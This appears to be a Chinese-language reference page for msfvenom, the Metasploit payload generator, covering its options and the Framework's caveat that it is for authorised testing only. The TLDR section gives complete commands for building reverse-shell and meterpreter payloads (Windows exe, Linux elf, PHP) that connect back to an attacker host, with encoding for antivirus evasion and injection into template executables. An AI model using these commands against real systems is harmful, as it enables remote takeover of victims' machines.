# TAGLINE

为 Metasploit 生成 payload

# TLDR

**列出可用 payload**

```msfvenom -l payloads```

**列出编码器**

```msfvenom -l encoders```

**生成 Windows 反向 shell**

```msfvenom -p windows/meterpreter/reverse_tcp LHOST=[192.168.1.10] LPORT=[4444] -f exe > [shell.exe]```

**生成 Linux payload**

```msfvenom -p linux/x86/shell_reverse_tcp LHOST=[192.168.1.10] LPORT=[4444] -f elf > [shell.elf]```

**对 payload 进行编码**

```msfvenom -p [payload] -e x86/shikata_ga_nai -i [5] -f exe > [encoded.exe]```

**生成 shellcode**

```msfvenom -p [payload] -f c```

**生成 web payload**

```msfvenom -p php/meterpreter/reverse_tcp LHOST=[ip] LPORT=[port] -f raw > [shell.php]```

# SYNOPSIS

**msfvenom** [_options_]

# PARAMETERS

**-p** _PAYLOAD_
> 要使用的 payload。用 `-` 表示从 stdin 读取。

**-f** _FORMAT_
> 输出格式（exe、elf、raw、c、python、powershell 等）。

**-e** _ENCODER_
> 要使用的编码器。

**-i** _COUNT_
> 编码迭代次数。

**-l** _TYPE_
> 列出可用条目（payloads、encoders、nops、formats、all）。

**-a** _ARCH_
> 目标体系结构（x86、x64、arm 等）。

**--platform** _PLATFORM_
> 目标平台（windows、linux、osx、android 等）。

**-b** _CHARS_
> payload 中要避免的字符（坏字符）。

**-o** _FILE_
> 将 payload 保存到文件。

**-x** _FILE_
> 使用自定义可执行文件作为模板。

**-k**
> 保留模板原有功能，并将 payload 作为新线程注入。

**-n** _LENGTH_
> 在前面添加指定长度的 NOP sled。

**-s** _SIZE_
> payload 最大大小（字节）。

**--smallest**
> 生成尽可能小的 payload。

**LHOST**
> 本地主机地址（payload 变量）。

**LPORT**
> 本地端口号（payload 变量）。

**--help**
> 显示帮助信息。

# DESCRIPTION

**msfvenom** 为 Metasploit 生成 payload。它合并了 msfpayload 和 msfencode 的功能。

该工具用于创建 shellcode 和可执行文件，支持编码和格式转换。

# CAVEATS

仅限授权测试。杀毒软件可能检出 payload。属于 Metasploit Framework。

# HISTORY

msfvenom 取代了 Metasploit Framework 中的 **msfpayload 和 msfencode**，统一了 payload 的生成流程。

# SEE ALSO

[msfconsole](/man/msfconsole)(1), [msfpc](/man/msfpc)(1), [nmap](/man/nmap)(1)
